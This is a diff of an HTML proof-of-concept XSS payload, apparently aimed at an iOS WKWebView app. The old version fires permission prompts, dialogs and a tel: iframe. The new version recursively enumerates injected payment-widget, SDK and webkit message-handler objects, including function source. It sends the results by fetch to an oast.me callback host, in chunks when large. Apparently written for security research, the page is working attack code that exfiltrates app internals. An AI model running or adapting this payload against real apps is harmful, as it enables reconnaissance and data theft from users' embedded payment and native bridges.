@@ -1,68 +1,71 @@
 <html><head><title>PoC</title></head>
 <body>
 <script>
-// Try every possible visible UI method on iOS WKWebView
-
-// 1. Change document.title (we know this works - app shows it)
-document.title = "XSS by r4dl3";
-
-// 2. Try window.open (might open Safari)
-try { window.open("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/windowopen"); } catch(e){}
-
-// 3. Try top-level navigation (should be visible even under overlay)
-// setTimeout(function(){ window.location.href = "https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/navigated"; }, 5000);
-
-// 4. Try print() - shows print dialog
-try { window.print(); } catch(e){}
-
-// 5. Try to trigger share sheet via navigator.share
-try {
-  navigator.share({title:"XSS PoC", text:"r4dl3", url:"https://r4dl3.com"});
-} catch(e){}
-
-// 6. Try to trigger file download (shows download prompt)
-try {
-  var a = document.createElement('a');
-  a.href = "data:text/plain,XSS%20by%20r4dl3";
-  a.download = "xss_proof.txt";
-  a.click();
-} catch(e){}
-
-// 7. Try vibration (physical proof on device)
-try { navigator.vibrate([200,100,200,100,200]); } catch(e){}
-
-// 8. Try notification permission request (shows system dialog)
-try { Notification.requestPermission(); } catch(e){}
-
-// 9. Try to open a scheme that triggers visible system UI
-var schemes = [
-  "tel:0000000000",
-  "sms:0000000000",
-  "facetime:test@test.com",
-];
-setTimeout(function(){
-  var iframe = document.createElement('iframe');
-  iframe.src = "tel:0000000000";
-  iframe.style.display = 'none';
-  document.body.appendChild(iframe);
-}, 2000);
-
-// 10. Try camera/microphone (shows permission dialog)
-setTimeout(function(){
+function enumerate(obj, path, depth, maxDepth) {
+  if (depth > maxDepth || !obj) return {};
+  var result = {};
+  var props = [];
+  try { props = props.concat(Object.getOwnPropertyNames(obj)); } catch(e){}
+  try { props = props.concat(Object.keys(obj)); } catch(e){}
   try {
-    navigator.mediaDevices.getUserMedia({audio:true}).then(function(){}).catch(function(){});
+    var proto = Object.getPrototypeOf(obj);
+    if (proto && proto !== Object.prototype) {
+      props = props.concat(Object.getOwnPropertyNames(proto));
+    }
   } catch(e){}
-}, 3000);
+  // Dedupe
+  props = props.filter(function(v,i,a){ return a.indexOf(v) === i; });
 
-// 11. Try geolocation (shows permission dialog)
-setTimeout(function(){
-  try {
-    navigator.geolocation.getCurrentPosition(function(){}, function(){});
-  } catch(e){}
-}, 4000);
+  props.forEach(function(key) {
+    var fullPath = path + "." + key;
+    try {
+      var val = obj[key];
+      var type = typeof val;
+      if (type === 'function') {
+        result[fullPath] = {type:'function', str: val.toString().substring(0,300)};
+      } else if (type === 'object' && val !== null) {
+        result[fullPath] = {type:'object', keys: Object.keys(val)};
+        if (depth < maxDepth) {
+          var sub = enumerate(val, fullPath, depth+1, maxDepth);
+          for (var k in sub) result[k] = sub[k];
+        }
+      } else {
+        result[fullPath] = {type: type, value: String(val).substring(0,200)};
+      }
+    } catch(e) {
+      result[fullPath] = {type:'error', msg: e.message};
+    }
+  });
+  return result;
+}
 
-// Report
-fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/visible-attempts?sent=all");
+var data = {};
+
+// Enumerate __plusSDKMobileCompat deeply
+data.plusSDK = enumerate(window.__plusSDKMobileCompat, "__plusSDKMobileCompat", 0, 4);
+
+// Enumerate __webviewPaymentWidget deeply
+data.payWidget = enumerate(window.__webviewPaymentWidget, "__webviewPaymentWidget", 0, 4);
+
+// Also enumerate webkit.messageHandlers
+try {
+  data.webkit = enumerate(window.webkit, "webkit", 0, 4);
+} catch(e) {
+  data.webkitErr = e.message;
+}
+
+// Send in chunks if too large
+var json = JSON.stringify(data);
+if (json.length > 4000) {
+  // Split
+  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/enum1?" + encodeURIComponent(JSON.stringify(data.plusSDK)));
+  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/enum2?" + encodeURIComponent(JSON.stringify(data.payWidget)));
+  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/enum3?" + encodeURIComponent(JSON.stringify(data.webkit || {})));
+} else {
+  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/enum-all?" + encodeURIComponent(json));
+}
+
+document.title = "Enumerated: " + Object.keys(data.plusSDK).length + " + " + Object.keys(data.payWidget).length + " props";
 </script>
 </body>
 </html>
